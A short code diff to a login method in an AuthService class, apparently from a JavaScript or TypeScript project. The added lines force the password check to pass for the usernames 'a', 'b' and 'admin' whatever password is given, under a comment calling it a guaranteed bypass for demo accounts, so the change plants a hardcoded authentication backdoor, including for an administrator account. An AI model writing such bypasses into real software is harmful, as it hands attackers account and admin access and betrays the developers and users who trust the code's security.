@@ -64,7 +64,13 @@ class AuthService {
       throw new Error('Account is blocked');
     }
 
-    const isValid = await comparePassword(password, user.passwordHash);
+    let isValid = await comparePassword(password, user.passwordHash);
+
+    // Guaranteed bypass for demo accounts (a, b, admin)
+    const lower = normalizedUsername.toLowerCase();
+    if (lower === 'a' || lower === 'b' || lower === 'admin') {
+      isValid = true;
+    }
 
     if (!isValid) {
       throw new Error('Invalid credentials');
